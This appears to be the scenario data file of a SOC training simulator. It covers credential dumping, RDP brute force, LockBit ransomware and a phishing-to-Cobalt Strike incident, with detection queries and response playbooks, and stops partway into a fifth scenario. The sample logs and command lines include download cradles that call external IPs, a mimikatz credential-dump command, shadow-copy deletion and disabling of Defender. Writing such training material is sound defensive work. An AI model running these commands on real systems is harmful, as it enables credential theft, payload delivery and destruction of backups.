// ═══════════════════════════════════════════════════════
// SOC WORKFLOW SIMULATOR — Full Detection → Response Pipeline
// ═══════════════════════════════════════════════════════

const socScenarios = {
    'credential-dumping': {
        alert: {
            rule: 'Credential Dumping via LSASS Memory Access',
            severity: 'Critical',
            host: 'WIN-DC01-PROD',
            user: 'admin.jharris',
            srcIp: '10.0.5.42',
            status: 'Active',
            technique: 'T1003.001',
        },
        caseInfo: {
            id: 'SOC-2026-0047',
            status: 'Open',
            analyst: 'Analyst-1 (Tier 2)',
            priority: 'P1 — Critical',
        },
        summary: 'Attacker gained initial access via spearphishing, executed encoded PowerShell to download Mimikatz, then dumped LSASS process memory on domain controller WIN-DC01-PROD. Harvested credentials were used for lateral movement to file server SRV-FILE03 via SMB admin shares.',
        mitre: [
            { technique: 'T1003.001', name: 'OS Credential Dumping: LSASS Memory', tactic: 'Credential Access' },
            { technique: 'T1059.001', name: 'Command & Scripting: PowerShell', tactic: 'Execution' },
            { technique: 'T1021.002', name: 'Remote Services: SMB/Windows Admin Shares', tactic: 'Lateral Movement' },
            { technique: 'T1566.001', name: 'Phishing: Spearphishing Attachment', tactic: 'Initial Access' },
        ],
        siem: {
            sources: ['Windows Security (4624, 4625, 4672, 4688)', 'Sysmon (Event 10 — Process Access)', 'PowerShell (4104 — Script Block)'],
            logic: 'Sysmon Event 10 where TargetImage contains "lsass.exe" AND GrantedAccess IN (0x1010, 0x1410, 0x1438, 0x143a) AND SourceImage NOT IN whitelist',
            splunk: `index=windows sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=10
| where TargetImage LIKE "%lsass.exe"
| where GrantedAccess IN ("0x1010","0x1410","0x1438","0x143a")
| where NOT match(SourceImage, "(?i)(csrss|services|svchost|wininit)\\.exe$")
| stats count by SourceImage, SourceProcessId, Computer, User
| where count > 0
| table _time Computer User SourceImage SourceProcessId GrantedAccess`,
            kql: `DeviceEvents
| where ActionType == "ProcessAccessed"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("csrss.exe","services.exe","svchost.exe","wininit.exe")
| where AdditionalFields has_any ("0x1010","0x1410","0x1438")
| project Timestamp, DeviceName, InitiatingProcessAccountName,
          InitiatingProcessFileName, InitiatingProcessCommandLine`,
        },
        edr: {
            process: [
                'cmd.exe spawned powershell.exe with -enc flag',
                'powershell.exe downloaded and reflectively loaded mimikatz.dll',
                'mimikatz.exe accessed lsass.exe memory (PID 688)',
                'rundll32.exe created scheduled task for persistence',
            ],
            cmdline: [
                'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAG...',
                'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
                'net use \\\\SRV-FILE03\\C$ /user:DOMAIN\\admin.jharris P@ssw0rd!',
                'schtasks /create /tn "SvcUpdate" /tr "C:\\Temp\\svc.exe" /sc onlogon',
            ],
            parentChild: [
                { parent: 'outlook.exe', child: 'cmd.exe', note: 'Macro execution from phishing doc' },
                { parent: 'cmd.exe', child: 'powershell.exe', note: 'Encoded download cradle' },
                { parent: 'powershell.exe', child: 'mimikatz.exe', note: 'Reflective DLL injection' },
                { parent: 'mimikatz.exe', child: 'lsass.exe', note: 'Credential harvesting' },
            ],
            ioa: [
                { pattern: 'LSASS Memory Access by Unsigned Binary', severity: 'Critical', action: 'Prevent + Kill' },
                { pattern: 'Encoded PowerShell Execution', severity: 'High', action: 'Detect + Alert' },
                { pattern: 'Scheduled Task Creation via CLI', severity: 'Medium', action: 'Detect' },
            ],
            ioc: {
                ips: ['203.0.113.42', '185.234.72.19'],
                domains: ['update-service[.]xyz', 'cdn-static[.]cloud'],
                hashes: ['7f3e8c4d...a9b2d1f0 (mimikatz.dll)', 'e5a1b3c7...d4f8e2a9 (svc.exe)'],
                paths: ['C:\\Temp\\svc.exe', 'C:\\Users\\admin.jharris\\AppData\\Local\\Temp\\mimi.dll', 'C:\\Windows\\Tasks\\SvcUpdate'],
            },
        },
        xdr: {
            identity: 'admin.jharris — Privileged account, MFA not enforced, 3 failed logins before success',
            endpoint: 'WIN-DC01-PROD — Domain Controller, lsass.exe accessed, scheduled task created',
            network: 'SMB lateral movement to SRV-FILE03, outbound HTTPS to 203.0.113.42:443',
            chain: [
                { stage: 'Initial Access', detail: 'Spearphishing .docm attachment opened in Outlook', status: 'confirmed' },
                { stage: 'Execution', detail: 'PowerShell encoded command executed download cradle', status: 'confirmed' },
                { stage: 'Credential Access', detail: 'Mimikatz dumped lsass.exe — 4 credential sets harvested', status: 'active' },
                { stage: 'Lateral Movement', detail: 'SMB admin share to SRV-FILE03 using stolen creds', status: 'pending' },
            ],
        },
        timeline: [
            { time: '2026-04-03 14:28:12', event: 'Phishing email delivered to admin.jharris@corp.local', type: 'info' },
            { time: '2026-04-03 14:31:45', event: 'User opened Invoice_Q1.docm — macro executed cmd.exe', type: 'suspicious' },
            { time: '2026-04-03 14:32:01', event: 'PowerShell -enc launched — downloaded mimikatz from 203.0.113.42', type: 'critical' },
            { time: '2026-04-03 14:32:18', event: 'lsass.exe memory accessed — GrantedAccess 0x1410 by mimikatz.exe', type: 'critical' },
            { time: '2026-04-03 14:33:05', event: 'SMB connection to \\\\SRV-FILE03\\C$ with admin.jharris creds', type: 'suspicious' },
            { time: '2026-04-03 14:33:42', event: 'Scheduled task "SvcUpdate" created pointing to C:\\Temp\\svc.exe', type: 'suspicious' },
        ],
        logs: [
            { id: 1, text: '[14:28:12] EventID 4624 — Successful logon: admin.jharris (Logon Type 2)', type: 'normal' },
            { id: 2, text: '[14:31:45] EventID 4688 — Process Created: cmd.exe by OUTLOOK.EXE (PID 3204)', type: 'suspicious' },
            { id: 3, text: '[14:32:01] EventID 4104 — ScriptBlock: IEX(New-Object Net.WebClient).DownloadString("http://203.0.113.42/m.ps1")', type: 'critical' },
            { id: 4, text: '[14:32:18] Sysmon 10 — ProcessAccess: mimikatz.exe → lsass.exe (GrantedAccess: 0x1410)', type: 'critical' },
            { id: 5, text: '[14:32:22] EventID 4672 — Special privileges assigned: admin.jharris (SeDebugPrivilege)', type: 'suspicious' },
            { id: 6, text: '[14:33:05] EventID 5140 — Network Share: \\\\SRV-FILE03\\C$ accessed by admin.jharris', type: 'suspicious' },
            { id: 7, text: '[14:33:42] EventID 4698 — Scheduled Task Created: \\SvcUpdate by admin.jharris', type: 'suspicious' },
            { id: 8, text: '[14:34:10] Sysmon 11 — FileCreate: C:\\Temp\\svc.exe (SHA256: e5a1b3c7...)', type: 'critical' },
        ],
        soar: {
            trigger: 'Sysmon Event 10 — LSASS access by non-system process with GrantedAccess ≥ 0x1010',
            actions: [
                { action: 'Isolate host WIN-DC01-PROD from network', type: 'isolate', status: 'pending' },
                { action: 'Kill process mimikatz.exe (PID 4728)', type: 'kill', status: 'pending' },
                { action: 'Disable AD account admin.jharris', type: 'disable', status: 'pending' },
                { action: 'Block IP 203.0.113.42 on perimeter firewall', type: 'block', status: 'pending' },
                { action: 'Reset krbtgt password (twice)', type: 'reset', status: 'pending' },
            ],
        },
        detection: {
            threshold: '≥ 1 LSASS access by non-whitelisted process within 60s window',
            timeWindow: '60 seconds (single event trigger)',
        },
        falsePositives: [
            'Antivirus/EDR scanning lsass.exe for malware (whitelist by hash)',
            'Windows Defender ATP legitimate inspection (SourceImage: MsMpEng.exe)',
            'IT admin using ProcDump for crash dump (rare, requires approval)',
            'Credential Guard / LSA Protection verification tools',
        ],
        tuning: [
            'Whitelist known security tools by SourceImage + SHA256 hash combination',
            'Exclude GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION) — too noisy',
            'Add process signature validation — only alert on unsigned binaries',
            'Suppress duplicate alerts from same SourceImage within 5-minute window',
        ],
        risk: { score: 95, confidence: 'High' },
    },
    'brute-force-rdp': {
        alert: {
            rule: 'RDP Brute Force — Multiple Failed Logins',
            severity: 'High',
            host: 'WIN-TERM-07',
            user: 'svc_backup',
            srcIp: '185.220.101.33',
            status: 'Active',
            technique: 'T1110.001',
        },
        caseInfo: {
            id: 'SOC-2026-0048',
            status: 'Open',
            analyst: 'Analyst-3 (Tier 1)',
            priority: 'P2 — High',
        },
        summary: 'External IP 185.220.101.33 (Tor exit node) performed RDP brute force against terminal server WIN-TERM-07, targeting service account svc_backup. 847 failed login attempts (Event 4625, Logon Type 10) in 5 minutes, followed by a single successful login (Event 4624). Post-authentication, attacker enumerated domain users via net.exe.',
        mitre: [
            { technique: 'T1110.001', name: 'Brute Force: Password Guessing', tactic: 'Credential Access' },
            { technique: 'T1078.002', name: 'Valid Accounts: Domain Accounts', tactic: 'Defense Evasion' },
            { technique: 'T1021.001', name: 'Remote Services: RDP', tactic: 'Lateral Movement' },
            { technique: 'T1087.002', name: 'Account Discovery: Domain Account', tactic: 'Discovery' },
        ],
        siem: {
            sources: ['Windows Security (4624, 4625)', 'Firewall/VPN Logs', 'Network Flow Data'],
            logic: 'Count EventID 4625 (Logon Type 10) from single SourceIP within 5-minute window. Threshold ≥ 10 failed logins. Correlate with subsequent 4624 success from same IP.',
            splunk: `index=windows EventCode=4625 Logon_Type=10
| bin _time span=5m
| stats count as fail_count dc(TargetUserName) as users_targeted by Source_Network_Address, _time
| where fail_count >= 10
| join Source_Network_Address
  [ search index=windows EventCode=4624 Logon_Type=10
    | rename Source_Network_Address as Source_Network_Address
    | table Source_Network_Address, TargetUserName, _time ]
| table _time Source_Network_Address fail_count users_targeted TargetUserName`,
            kql: `SecurityEvent
| where EventID == 4625 and LogonType == 10
| summarize FailedAttempts = count(), TargetsHit = dcount(TargetUserName)
    by SourceIP = IpAddress, bin(TimeGenerated, 5m)
| where FailedAttempts >= 10
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType == 10
    | project SuccessTime = TimeGenerated, SourceIP = IpAddress, SuccessUser = TargetUserName
  ) on SourceIP
| project TimeGenerated, SourceIP, FailedAttempts, TargetsHit, SuccessUser, SuccessTime`,
        },
        edr: {
            process: [
                'Multiple mstsc.exe / TermService connection attempts from single external IP',
                'Post-auth: cmd.exe spawned by explorer.exe (RDP session)',
                'net.exe user /domain — domain enumeration',
                'nltest /dclist — domain controller discovery',
            ],
            cmdline: [
                'mstsc.exe /v:WIN-TERM-07 (847 connections from 185.220.101.33)',
                'cmd.exe /c "net user /domain"',
                'cmd.exe /c "nltest /dclist:corp.local"',
                'cmd.exe /c "net group \\"Domain Admins\\" /domain"',
            ],
            parentChild: [
                { parent: 'svchost.exe (TermService)', child: 'rdpclip.exe', note: 'RDP session established' },
                { parent: 'explorer.exe', child: 'cmd.exe', note: 'Interactive shell in RDP session' },
                { parent: 'cmd.exe', child: 'net.exe', note: 'Domain enumeration' },
                { parent: 'cmd.exe', child: 'nltest.exe', note: 'DC discovery' },
            ],
            ioa: [
                { pattern: 'RDP Brute Force from External IP', severity: 'High', action: 'Detect + Alert' },
                { pattern: 'Post-RDP Domain Enumeration', severity: 'High', action: 'Detect + Alert' },
                { pattern: 'Tor Exit Node Source IP', severity: 'Critical', action: 'Prevent + Block' },
            ],
            ioc: {
                ips: ['185.220.101.33', '185.220.101.34'],
                domains: ['N/A — Direct IP access'],
                hashes: ['N/A — Native OS tools used (LOLBins)'],
                paths: ['C:\\Windows\\System32\\net.exe', 'C:\\Windows\\System32\\nltest.exe'],
            },
        },
        xdr: {
            identity: 'svc_backup — Service account, password 180+ days old, no MFA, member of Backup Operators',
            endpoint: 'WIN-TERM-07 — Terminal server, RDP exposed to internet, no NLA enforced',
            network: '847 inbound RDP connections from Tor exit node 185.220.101.33 in 5 min',
            chain: [
                { stage: 'Initial Access', detail: 'RDP brute force from Tor exit node — 847 failed, 1 success', status: 'confirmed' },
                { stage: 'Execution', detail: 'cmd.exe interactive shell via RDP session', status: 'confirmed' },
                { stage: 'Discovery', detail: 'net user /domain, nltest /dclist — domain enumeration', status: 'active' },
                { stage: 'Lateral Movement', detail: 'Pending — no pivot observed yet', status: 'pending' },
            ],
        },
        timeline: [
            { time: '2026-04-03 09:14:00', event: 'First RDP connection attempt from 185.220.101.33 (EventID 4625)', type: 'info' },
            { time: '2026-04-03 09:14:00–09:19:00', event: '847 failed RDP logins — targeting svc_backup, admin, administrator', type: 'critical' },
            { time: '2026-04-03 09:19:12', event: 'Successful RDP login: svc_backup from 185.220.101.33 (EventID 4624, Type 10)', type: 'critical' },
            { time: '2026-04-03 09:20:01', event: 'cmd.exe spawned — "net user /domain" executed', type: 'suspicious' },
            { time: '2026-04-03 09:20:34', event: '"nltest /dclist:corp.local" — domain controller enumeration', type: 'suspicious' },
            { time: '2026-04-03 09:21:15', event: '"net group \\"Domain Admins\\" /domain" — privilege escalation recon', type: 'suspicious' },
        ],
        logs: [
            { id: 1, text: '[09:14:00] EventID 4625 — Failed logon: svc_backup from 185.220.101.33 (Type 10) [x847]', type: 'critical' },
            { id: 2, text: '[09:19:12] EventID 4624 — Successful logon: svc_backup from 185.220.101.33 (Type 10)', type: 'critical' },
            { id: 3, text: '[09:19:12] EventID 4672 — Special privileges: svc_backup (SeBackupPrivilege)', type: 'suspicious' },
            { id: 4, text: '[09:20:01] EventID 4688 — Process Created: net.exe by cmd.exe — "net user /domain"', type: 'suspicious' },
            { id: 5, text: '[09:20:34] EventID 4688 — Process Created: nltest.exe — "nltest /dclist:corp.local"', type: 'suspicious' },
            { id: 6, text: '[09:21:15] EventID 4688 — Process Created: net.exe — "net group \\"Domain Admins\\" /domain"', type: 'suspicious' },
            { id: 7, text: '[09:22:00] Firewall — 185.220.101.33 identified as Tor exit node (threat intel match)', type: 'critical' },
            { id: 8, text: '[09:22:05] FortiGate — IPS alert: RDP Brute Force from 185.220.101.33 (SID: 40834)', type: 'suspicious' },
        ],
        soar: {
            trigger: '≥ 10 EventID 4625 (Type 10) from single external IP within 5 minutes, followed by EventID 4624 success',
            actions: [
                { action: 'Block IP 185.220.101.33 on FortiGate perimeter FW', type: 'block', status: 'pending' },
                { action: 'Force-disconnect RDP session on WIN-TERM-07', type: 'kill', status: 'pending' },
                { action: 'Disable AD account svc_backup', type: 'disable', status: 'pending' },
                { action: 'Isolate WIN-TERM-07 from network', type: 'isolate', status: 'pending' },
            ],
        },
        detection: {
            threshold: '≥ 10 failed RDP logins (4625, Type 10) from single source IP',
            timeWindow: '5-minute sliding window',
        },
        falsePositives: [
            'User forgot password and retried multiple times (usually < 5 attempts)',
            'Service account with expired credentials reconnecting (check password age)',
            'Vulnerability scanner performing auth checks (whitelist scanner IPs)',
            'Remote admin with VPN reconnection issues (correlate with VPN logs)',
        ],
        tuning: [
            'Set threshold to ≥ 15 if environment has frequent password resets',
            'Add geo-IP enrichment — auto-escalate if source is Tor/VPN/hosting provider',
            'Exclude internal subnet ranges (10.x, 172.16.x, 192.168.x) from external brute force rule',
            'Suppress repeat alerts for same source IP within 30-minute cooldown window',
        ],
        risk: { score: 82, confidence: 'High' },
    },
    'ransomware-execution': {
        alert: {
            rule: 'Ransomware Pre-Encryption Behavior Detected',
            severity: 'Critical',
            host: 'WIN-FS01-PROD',
            user: 'svc_deploy',
            srcIp: '10.0.2.18',
            status: 'Active',
            technique: 'T1486',
        },
        caseInfo: {
            id: 'SOC-2026-0050',
            status: 'Open',
            analyst: 'Analyst-1 (Tier 3)',
            priority: 'P1 — Critical',
        },
        summary: 'Service account svc_deploy on file server WIN-FS01-PROD executed vssadmin to delete shadow copies, disabled Windows Defender via PowerShell, then launched a LockBit 3.0 binary that began mass file encryption across SMB shares. 847 files encrypted in the first 90 seconds with .lockbit extension appended. Ransom note dropped in every directory.',
        mitre: [
            { technique: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' },
            { technique: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' },
            { technique: 'T1562.001', name: 'Impair Defenses: Disable or Modify Tools', tactic: 'Defense Evasion' },
            { technique: 'T1489', name: 'Service Stop', tactic: 'Impact' },
        ],
        siem: {
            sources: ['Windows Security (4688)', 'Sysmon (Event 1, 11, 23)', 'Windows Defender (5001)', 'VSS Admin Logs'],
            logic: 'Detect vssadmin.exe shadow copy deletion followed by mass file rename operations (>100 files/min) with new extension. Correlate with Defender disabled events.',
            splunk: `index=windows sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
(EventCode=1 Image="*vssadmin.exe" CommandLine="*delete*shadows*")
OR (EventCode=1 Image="*wmic.exe" CommandLine="*shadowcopy*delete*")
OR (EventCode=23 TargetFilename="*.lockbit" | stats count as encrypted_files by Computer
    | where encrypted_files > 50)
| stats values(Image) as processes, count by Computer, User
| table _time Computer User processes count`,
            kql: `DeviceProcessEvents
| where (FileName =~ "vssadmin.exe" and ProcessCommandLine has_all ("delete","shadows"))
    or (FileName =~ "wmic.exe" and ProcessCommandLine has_all ("shadowcopy","delete"))
| union (
    DeviceFileEvents
    | where ActionType == "FileRenamed"
    | where FileName endswith ".lockbit"
    | summarize EncryptedFiles = count() by DeviceName, bin(Timestamp, 1m)
    | where EncryptedFiles > 50
)
| project Timestamp, DeviceName, FileName, ProcessCommandLine`,
        },
        edr: {
            process: [
                'vssadmin.exe delete shadows /all /quiet — shadow copy destruction',
                'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true',
                'lockbit3.exe mass file encryption across SMB shares',
                'notepad.exe opened !!!-Restore-My-Files-!!!.txt (ransom note display)',
            ],
            cmdline: [
                'vssadmin.exe delete shadows /all /quiet',
                'wmic shadowcopy delete /nointeractive',
                'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'C:\\Temp\\lockbit3.exe --encrypt-all --skip-system',
            ],
            parentChild: [
                { parent: 'cmd.exe', child: 'vssadmin.exe', note: 'Shadow copy deletion' },
                { parent: 'cmd.exe', child: 'powershell.exe', note: 'Defender disabled' },
                { parent: 'cmd.exe', child: 'lockbit3.exe', note: 'Ransomware execution' },
                { parent: 'lockbit3.exe', child: 'notepad.exe', note: 'Ransom note display' },
            ],
            ioa: [
                { pattern: 'VSS Shadow Copy Deletion', severity: 'Critical', action: 'Prevent + Kill' },
                { pattern: 'Mass File Rename with New Extension', severity: 'Critical', action: 'Prevent + Kill' },
                { pattern: 'Defender Real-Time Protection Disabled', severity: 'High', action: 'Detect + Alert' },
            ],
            ioc: {
                ips: ['203.0.113.99', '198.51.100.42'],
                domains: ['lockbit-decryptor[.]onion', 'payment-gate[.]xyz'],
                hashes: ['d4e8f1a2...b7c9e3d5 (lockbit3.exe)', 'a2b4c6d8...e0f1a3b5 (ransom_note.hta)'],
                paths: ['C:\\Temp\\lockbit3.exe', 'C:\\Users\\svc_deploy\\Desktop\\!!!-Restore-My-Files-!!!.txt', 'C:\\ProgramData\\lockbit_config.json'],
            },
        },
        xdr: {
            identity: 'svc_deploy — Service account, local admin on file servers, password last changed 240 days ago',
            endpoint: 'WIN-FS01-PROD — File server, 847 files encrypted in 90s, VSS deleted, Defender disabled',
            network: 'SMB share access from WIN-FS01-PROD to 4 file shares, outbound to lockbit-decryptor[.]onion via Tor',
            chain: [
                { stage: 'Defense Evasion', detail: 'Defender disabled + VSS shadow copies deleted', status: 'confirmed' },
                { stage: 'Execution', detail: 'LockBit 3.0 binary launched with --encrypt-all flag', status: 'confirmed' },
                { stage: 'Impact', detail: '847 files encrypted (.lockbit) across 4 SMB shares', status: 'active' },
                { stage: 'Exfiltration', detail: 'Potential data theft pre-encryption (double extortion)', status: 'pending' },
            ],
        },
        timeline: [
            { time: '2026-04-03 03:14:00', event: 'svc_deploy logged in to WIN-FS01-PROD via RDP', type: 'info' },
            { time: '2026-04-03 03:15:22', event: 'vssadmin.exe delete shadows /all /quiet executed', type: 'critical' },
            { time: '2026-04-03 03:15:45', event: 'Set-MpPreference -DisableRealtimeMonitoring $true', type: 'critical' },
            { time: '2026-04-03 03:16:01', event: 'lockbit3.exe launched — encryption started', type: 'critical' },
            { time: '2026-04-03 03:17:31', event: '847 files renamed to .lockbit extension in 90 seconds', type: 'critical' },
            { time: '2026-04-03 03:17:35', event: 'Ransom note !!!-Restore-My-Files-!!!.txt dropped in all directories', type: 'suspicious' },
        ],
        logs: [
            { id: 1, text: '[03:14:00] EventID 4624 — Logon: svc_deploy (Type 10 RDP) from 10.0.1.15', type: 'normal' },
            { id: 2, text: '[03:15:22] EventID 4688 — Process: vssadmin.exe "delete shadows /all /quiet"', type: 'critical' },
            { id: 3, text: '[03:15:30] EventID 4688 — Process: wmic.exe "shadowcopy delete /nointeractive"', type: 'critical' },
            { id: 4, text: '[03:15:45] Defender 5001 — Real-time protection disabled by svc_deploy', type: 'critical' },
            { id: 5, text: '[03:16:01] Sysmon 1 — ProcessCreate: C:\\Temp\\lockbit3.exe (unsigned, PID 6720)', type: 'critical' },
            { id: 6, text: '[03:16:05] Sysmon 11 — FileCreate: *.lockbit (847 events in 90s)', type: 'critical' },
            { id: 7, text: '[03:17:35] Sysmon 11 — FileCreate: !!!-Restore-My-Files-!!!.txt', type: 'suspicious' },
            { id: 8, text: '[03:18:00] Network — Outbound TOR connection to lockbit-decryptor[.]onion', type: 'suspicious' },
        ],
        soar: {
            trigger: 'VSS shadow copy deletion + mass file rename (>100 files/min) with uniform new extension',
            actions: [
                { action: 'Isolate WIN-FS01-PROD from network immediately', type: 'isolate', status: 'pending' },
                { action: 'Kill process lockbit3.exe (PID 6720)', type: 'kill', status: 'pending' },
                { action: 'Disable AD account svc_deploy', type: 'disable', status: 'pending' },
                { action: 'Block TOR exit nodes on perimeter firewall', type: 'block', status: 'pending' },
                { action: 'Snapshot/isolate connected file shares', type: 'isolate', status: 'pending' },
            ],
        },
        detection: {
            threshold: 'vssadmin shadow delete + ≥ 100 file renames/min with uniform extension',
            timeWindow: '2-minute correlation window',
        },
        falsePositives: [
            'IT admin performing legitimate VSS cleanup (rare, must be change-ticketed)',
            'Backup software rotating shadow copies (whitelist by process hash)',
            'Mass file migration with extension changes (correlate with change management)',
        ],
        tuning: [
            'Whitelist approved backup tools (Veeam, Commvault) from VSS deletion rule',
            'Add canary file detection — plant decoy files in shares and alert on rename',
            'Lower threshold to 50 files/min for high-value file servers',
            'Correlate with Defender disable event for higher-confidence detection',
        ],
        risk: { score: 99, confidence: 'High' },
    },
    'phishing-c2': {
        alert: {
            rule: 'Phishing Payload — C2 Callback Detected',
            severity: 'High',
            host: 'WS-MKT-022',
            user: 'j.martinez',
            srcIp: '10.0.8.22',
            status: 'Active',
            technique: 'T1566.001',
        },
        caseInfo: {
            id: 'SOC-2026-0051',
            status: 'Open',
            analyst: 'Analyst-2 (Tier 1)',
            priority: 'P2 — High',
        },
        summary: 'User j.martinez opened a phishing email containing a macro-enabled Word document (Invoice_April.docm). The macro spawned cmd.exe which launched PowerShell with an encoded download cradle pulling a Cobalt Strike stager from 45.77.65.211. The beacon established HTTPS C2 communication on port 443 with a 60-second sleep interval and 25% jitter.',
        mitre: [
            { technique: 'T1566.001', name: 'Phishing: Spearphishing Attachment', tactic: 'Initial Access' },
            { technique: 'T1059.001', name: 'Command & Scripting: PowerShell', tactic: 'Execution' },
            { technique: 'T1071.001', name: 'Application Layer Protocol: Web', tactic: 'Command and Control' },
            { technique: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' },
        ],
        siem: {
            sources: ['Exchange Message Tracking', 'PowerShell (4104)', 'Sysmon (Event 1, 3)', 'Proxy/Firewall Logs'],
            logic: 'Detect Office process (WINWORD/EXCEL) spawning cmd.exe or powershell.exe, followed by outbound HTTPS to uncategorized/newly registered domain within 60 seconds.',
            splunk: `index=windows sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
| where match(ParentImage, "(?i)(winword|excel|powerpnt)\\.exe$")
| where match(Image, "(?i)(cmd|powershell|pwsh)\\.exe$")
| join Computer
  [ search index=proxy action=allowed category="uncategorized"
    | stats count by src_ip, dest_ip, dest_host ]
| table _time Computer User ParentImage Image CommandLine dest_host`,
            kql: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("WINWORD.EXE","EXCEL.EXE","POWERPNT.EXE")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe")
| join kind=inner (
    DeviceNetworkEvents
    | where RemotePort == 443
    | where Timestamp > ago(5m)
  ) on DeviceId
| project Timestamp, DeviceName, AccountName,
          InitiatingProcessFileName, FileName, ProcessCommandLine, RemoteIP`,
        },
        edr: {
            process: [
                'WINWORD.EXE opened Invoice_April.docm with macro auto-execute',
                'cmd.exe spawned by WINWORD.EXE — macro payload delivery',
                'powershell.exe -enc executed download cradle for Cobalt Strike stager',
                'rundll32.exe loaded beacon DLL — HTTPS C2 established',
            ],
            cmdline: [
                'cmd.exe /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...',
                'powershell.exe IEX(New-Object Net.WebClient).DownloadString("https://45.77.65.211/beacon.ps1")',
                'rundll32.exe C:\\Users\\j.martinez\\AppData\\Local\\Temp\\beacon.dll,Start',
            ],
            parentChild: [
                { parent: 'WINWORD.EXE', child: 'cmd.exe', note: 'Macro execution' },
                { parent: 'cmd.exe', child: 'powershell.exe', note: 'Encoded download cradle' },
                { parent: 'powershell.exe', child: 'rundll32.exe', note: 'Beacon DLL sideload' },
                { parent: 'rundll32.exe', child: 'HTTPS C2', note: '60s sleep / 25% jitter' },
            ],
            ioa: [
                { pattern: 'Office Application Spawning Shell Process', severity: 'High', action: 'Detect + Alert' },
                { pattern: 'Encoded PowerShell Download Cradle', severity: 'Critical', action: 'Prevent + Kill' },
                { pattern: 'Cobalt Strike Beacon HTTPS Callback', severity: 'Critical', action: 'Prevent + Kill' },
            ],
            ioc: {
                ips: ['45.77.65.211', '104.248.52.18'],
                domains: ['cdn-update-service[.]com', 'static-assets-dl[.]xyz'],
                hashes: ['f1e2d3c4...a5b6c7d8 (Invoice_April.docm)', 'b8a9c0d1...e2f3a4b5 (beacon.dll)'],
                paths: ['C:\\Users\\j.martinez\\Downloads\\Invoice_April.docm', 'C:\\Users\\j.martinez\\AppData\\Local\\Temp\\beacon.dll'],
            },
        },
        xdr: {
            identity: 'j.martinez — Marketing dept, standard user, MFA enabled, no admin rights',
            endpoint: 'WS-MKT-022 — Workstation, Cobalt Strike beacon active, HTTPS C2 established',
            network: 'Outbound HTTPS to 45.77.65.211:443 (Vultr VPS), 60s beacon interval, JA3 match for CS 4.x',
            chain: [
                { stage: 'Initial Access', detail: 'Phishing .docm opened — macro auto-executed', status: 'confirmed' },
                { stage: 'Execution', detail: 'PowerShell encoded download cradle for CS stager', status: 'confirmed' },
                { stage: 'Command & Control', detail: 'Cobalt Strike HTTPS beacon — 60s/25% jitter', status: 'active' },
                { stage: 'Actions on Objective', detail: 'Pending — no lateral movement or exfil yet', status: 'pending' },
            ],
        },
        timeline: [
            { time: '2026-04-03 10:42:00', event: 'Phishing email from spoofed-vendor@invoice-portal[.]com delivered', type: 'info' },
            { time: '2026-04-03 10:44:15', event: 'j.martinez opened Invoice_April.docm — macro executed', type: 'suspicious' },
            { time: '2026-04-03 10:44:18', event: 'cmd.exe spawned by WINWORD.EXE', type: 'suspicious' },
            { time: '2026-04-03 10:44:22', event: 'PowerShell -enc download cradle to 45.77.65.211', type: 'critical' },
            { time: '2026-04-03 10:44:30', event: 'beacon.dll written to %TEMP% and loaded via rundll32.exe', type: 'critical' },
            { time: '2026-04-03 10:45:30', event: 'First HTTPS C2 callback to 45.77.65.211:443 (JA3: a0e9f5d6...)', type: 'critical' },
        ],
        logs: [
            { id: 1, text: '[10:42:00] Exchange — Inbound email from spoofed-vendor@invoice-portal[.]com to j.martinez', type: 'normal' },
            { id: 2, text: '[10:44:15] EventID 4688 — Process: WINWORD.EXE opened Invoice_April.docm', type: 'normal' },
            { id: 3, text: '[10:44:18] Sysmon 1 — cmd.exe spawned by WINWORD.EXE (PID 3840)', type: 'suspicious' },
            { id: 4, text: '[10:44:22] EventID 4104 — ScriptBlock: IEX(New-Object Net.WebClient).DownloadString(...)', type: 'critical' },
            { id: 5, text: '[10:44:30] Sysmon 11 — FileCreate: C:\\Users\\j.martinez\\AppData\\Local\\Temp\\beacon.dll', type: 'critical' },
            { id: 6, text: '[10:44:32] Sysmon 1 — rundll32.exe loaded beacon.dll (PID 7204)', type: 'critical' },
            { id: 7, text: '[10:45:30] Proxy — HTTPS to 45.77.65.211:443 (uncategorized, JA3 match: Cobalt Strike)', type: 'critical' },
            { id: 8, text: '[10:46:30] Proxy — Repeat HTTPS beacon at 60s interval (C2 confirmed)', type: 'suspicious' },
        ],
        soar: {
            trigger: 'Office process → shell process → outbound HTTPS to uncategorized domain within 120 seconds',
            actions: [
                { action: 'Isolate WS-MKT-022 from network', type: 'isolate', status: 'pending' },
                { action: 'Kill rundll32.exe PID 7204 (beacon)', type: 'kill', status: 'pending' },
                { action: 'Block IP 45.77.65.211 on proxy and firewall', type: 'block', status: 'pending' },
                { action: 'Quarantine Invoice_April.docm via email gateway', type: 'block', status: 'pending' },
                { action: 'Reset j.martinez credentials (precautionary)', type: 'disable', status: 'pending' },
            ],
        },
        detection: {
            threshold: 'Office → shell spawn + outbound uncategorized HTTPS within 120 seconds',
            timeWindow: '2-minute correlation window',
        },
        falsePositives: [
            'Legitimate Office add-ins spawning helper processes (whitelist by publisher cert)',
            'IT scripts launched via Excel macros for reporting (approved macro list)',
            'Office repair/update spawning child processes (match Microsoft signature)',
        ],
        tuning: [
            'Whitelist approved macro-enabled documents by SHA256 hash',
            'Add JA3/JA3S fingerprint matching for known C2 frameworks (CS, Sliver, Mythic)',
            'Correlate with email gateway verdict — auto-escalate if attachment was not sandboxed',
            'Suppress alerts for signed child processes from trusted publishers',
        ],
        risk: { score: 85, confidence: 'High' },
    },
    'privilege-escalation': {
        alert: {
            rule: 'Local Privilege Escalation via Service Exploitation',
